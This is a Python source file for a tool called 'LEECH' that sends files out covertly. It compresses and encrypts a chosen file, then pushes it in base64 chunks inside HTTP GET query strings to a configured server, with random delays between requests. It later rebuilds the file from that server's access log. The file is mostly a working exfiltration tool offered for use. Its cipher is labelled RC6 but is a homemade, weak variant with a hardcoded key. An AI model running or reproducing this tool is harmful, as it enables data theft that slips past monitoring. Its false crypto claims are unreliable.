import uuid
import requests
import base64
from tkinter import filedialog, Tk
import time
import random
import string
import zlib
import struct

# === Configuration ===
UPLOAD_URL = "http://127.0.0.1:8080/?i="
DOWNLOAD_URL = "http://127.0.0.1:8080/access.log"
SLEEP_TIME = random.uniform(0.1,0.8)
compression_level = 6
key = b"64Jfh*3!2=Cn9&0>"

# === Logo ===
def show_logo():
    print("                                                           ")
    print("                                                           ")
    print(" ██▓         ▓█████      ▓█████       ▄████▄        ██░ ██ ")
    print("▓██▒         ▓█   ▀      ▓█   ▀      ▒██▀ ▀█       ▓██░ ██▒")
    print("▒██░         ▒███        ▒███        ▒▓█    ▄      ▒██▀▀██░")
    print("▒██░         ▒▓█  ▄      ▒▓█  ▄      ▒▓▓▄ ▄██▒     ░▓█ ░██ ")
    print("░██████▒ ██▓ ░▒████▒ ██▓ ░▒████▒ ██▓ ▒ ▓███▀ ░ ██▓ ░▓█▒░██▓")
    print("░ ▒░▓  ░ ▒▓▒ ░░ ▒░ ░ ▒▓▒ ░░ ▒░ ░ ▒▓▒ ░ ░▒ ▒  ░ ▒▓▒  ▒ ░░▒░▒")
    print("░ ░ ▒  ░ ░▒   ░ ░  ░ ░▒   ░ ░  ░ ░▒    ░  ▒    ░▒   ▒ ░▒░ ░")
    print("  ░ ░    ░      ░    ░      ░    ░   ░         ░    ░  ░░ ░")
    print("    ░  ░  ░     ░  ░  ░     ░  ░  ░  ░ ░        ░   ░  ░  ░")
    print("          ░           ░           ░  ░          ░          ")
    print("                                                           ")
    print("     (L)azy (E)ntity (E)xploits (C)ursed (H)osts v0.1      ")
    print("                                                           ")
    print("                 by Nikolaos Tsapakis                      ")
    print("                                                           ")
    print("                                                           ")
    return 0

# === Encryption ===
# RC6 constants
WORD_SIZE = 32   # 32-bit words
BLOCK_SIZE = 128 # RC6 block size in bits
NUM_ROUNDS = 20  # RC6 default number of rounds

# Helper function to rotate a 32-bit word left by n bits
def rotl(x, n):
    return ((x << n) & 0xFFFFFFFF) | (x >> (WORD_SIZE - n))

# Helper function to rotate a 32-bit word right by n bits
def rotr(x, n):
    return ((x >> n) & 0xFFFFFFFF) | (x << (WORD_SIZE - n))

# Key schedule to generate subkeys from the user key
def key_schedule(key, key_size=128):
    if key_size == 128:
        # 128-bit key => 4 words (4 * 32 bits)
        key_words = [struct.unpack('>I', key[i:i+4])[0] for i in range(0, 16, 4)]
    elif key_size == 192:
        # 192-bit key => 6 words (6 * 32 bits)
        key_words = [struct.unpack('>I', key[i:i+4])[0] for i in range(0, 24, 4)]
    elif key_size == 256:
        # 256-bit key => 8 words (8 * 32 bits)
        key_words = [struct.unpack('>I', key[i:i+4])[0] for i in range(0, 32, 4)]
    else:
        raise ValueError("Unsupported key size")

    # Create S array
    P32 = 0xB7E15163  # The magic constant
    Q32 = 0x9E3779B9  # The golden ratio
    S = [P32]
    for i in range(1, 44):
        S.append(S[-1] + Q32)

    # Mixing into S array
    L = len(key_words)
    i = j = 0
    A = B = 0
    for k in range(44):
        S[k] = (S[k] + A + B) & 0xFFFFFFFF
        A = S[k]
        B = key_words[i]
        i = (i + 1) % L
        j = (j + 1) % L

    return S

# RC6 encryption function
def rc6_encrypt(plaintext, key, key_size=128):
    # Generate the subkeys
    S = key_schedule(key, key_size)

    # Split the 128-bit input into two 64-bit blocks (p and q)
    p, q = struct.unpack('>II', plaintext[:8]), struct.unpack('>II', plaintext[8:])
    A, B = p
    C, D = q

    # 20 rounds of encryption
    for round in range(1, NUM_ROUNDS + 1):
        A = (A + B) & 0xFFFFFFFF
        A = rotl(A, 3)
        A = A ^ S[2 * round - 2]
        B = (B + A) & 0xFFFFFFFF
        B = rotl(B, 3)
        B = B ^ S[2 * round - 1]
        C = (C + D) & 0xFFFFFFFF
        C = rotl(C, 3)
        C = C ^ S[2 * round]
        D = (D + C) & 0xFFFFFFFF
        D = rotl(D, 3)
        D = D ^ S[2 * round + 1]

    return struct.pack('>IIII', A, B, C, D)

# RC6 decryption function
def rc6_decrypt(ciphertext, key, key_size=128):
    # Generate the subkeys
    S = key_schedule(key, key_size)

    # Split the 128-bit input into two 64-bit blocks (p and q)
    A, B, C, D = struct.unpack('>IIII', ciphertext)

    # 20 rounds of decryption
    for round in range(NUM_ROUNDS, 0, -1):
        D = D ^ S[2 * round + 1]
        D = rotr(D, 3)
        D = (D - C) & 0xFFFFFFFF
        C = C ^ S[2 * round]
        C = rotr(C, 3)
        C = (C - D) & 0xFFFFFFFF
        B = B ^ S[2 * round - 1]
        B = rotr(B, 3)
        B = (B - A) & 0xFFFFFFFF
        A = A ^ S[2 * round - 2]
        A = rotr(A, 3)
        A = (A - B) & 0xFFFFFFFF

    return struct.pack('>II', A, B) + struct.pack('>II', C, D)

# === Compression ===
# Function to compress data using zlib (DEFLATE)
def compress_data(data: bytes, level: int = 6) -> bytes:
    """
    Compress data using zlib with DEFLATE algorithm.
    :param data: Data to be compressed (bytes)
    :param level: Compression level (0-9, higher = better compression, slower)
    :return: Compressed data (bytes)
    """
    return zlib.compress(data, level)

# Function to decompress data using zlib
def decompress_data(data: bytes) -> bytes:
    """
    Decompress data that was compressed with zlib (DEFLATE algorithm).
    :param data: Compressed data (bytes)
    :return: Decompressed data (bytes)
    """
    return zlib.decompress(data)

# === File ID ===
def generate_random_id(length=5):
    characters = string.ascii_letters + string.digits  # a-zA-Z0-9
    random_id = ''.join(random.choices(characters, k=length))
    return random_id

# === Upload ===
def upload_file(file_path: str):
    file_id = generate_random_id()
    print(f"[v] Uploading with file ID: {file_id}")

    with open(file_path, 'rb') as f:
        data = f.read()
        # Compress
        compressed = compress_data(data, compression_level)
        
        #Encrypt
        encrypted = b''

        # Process the file in blocks of 16 bytes
        for i in range(0, len(compressed), 16):
            block = compressed[i:i + 16]
            if len(block) < 16:
                block = block + b'\x00' * (16 - len(block))  # Pad to 16 bytes
            encrypted += rc6_encrypt(block, key)
        
    chunk_size = 500
    for i in range(0, len(encrypted), chunk_size):
        chunk = encrypted[i:i + chunk_size]
        encoded = base64.b64encode(chunk).decode()  # Standard Base64 (preserves '=')

        # Manually build URL to prevent auto-encoding
        full_url = f"{UPLOAD_URL}/{file_id}{encoded}"
        response = requests.get(full_url)

        if response.status_code != 200:
            print(f"[!] Failed to upload chunk starting at byte {i}")
        else:
            print(f"[v] Chunk starting at byte {i} uploaded")
        
        time.sleep(SLEEP_TIME)

    print(f"[v] Upload complete. Save this file ID to download later: {file_id}")

# === Download ===
def download_file():
    file_id = input("[v] Enter file ID to download: ").strip()
    response = requests.get(DOWNLOAD_URL)

    if response.status_code != 200:
        print("[!] Failed to download data.")
        return

    chunks = []

    for line in response.text.strip().splitlines():
        if file_id in line:
            try:
                chunk_part = line.split(file_id, 1)[1]
                chunk_clean = chunk_part.split(" ", 1)[0]  # Trim at first space
                chunks.append(chunk_clean)
            except IndexError:
                print("[!] Malformed line skipped.")

    if not chunks:
        print("[!] No chunks found for this file ID.")
        return

    full_data = bytearray()
    for b64_chunk in chunks:
        try:
            chunk = base64.b64decode(b64_chunk)
            full_data.extend(chunk)
        except Exception as e:
            print(f"[!] Failed to decode a chunk: {e}")
        else:
            print(f"[v] Chunk processed")

    file_path = filedialog.asksaveasfilename(defaultextension=".bin", title="Save Reconstructed File")
    if not file_path:
        print("[!] No file location selected.")
        return

    with open(file_path, "wb") as f:
        
        # Decrypt
        decrypted = b''

        # Process the file in blocks of 16 bytes
        for i in range(0, len(full_data), 16):
            block = full_data[i:i + 16]
            decrypted += rc6_decrypt(block, key)

        # Remove padding (if any)
        decrypted = decrypted.rstrip(b'\x00')
               
        # Decompress
        decompressed = decompress_data(decrypted)
        
        f.write(decompressed)
    print(f"[v] File saved to: {file_path}")

# === File Dialog ===
def select_file():
    root = Tk()
    root.withdraw()
    return filedialog.askopenfilename()

# === Menu ===
def main():
    show_logo()
    print("1. Upload a file")
    print("2. Download a file")
    print("")
    choice = input("[v] Choose option [1/2]: ").strip()
    if choice == "1":
        file_path = select_file()
        if file_path:
            upload_file(file_path)
        else:
            print("[!] No file selected.")
    elif choice == "2":
        download_file()
    else:
        print("[!] Invalid choice.")

if __name__ == "__main__":
    main()
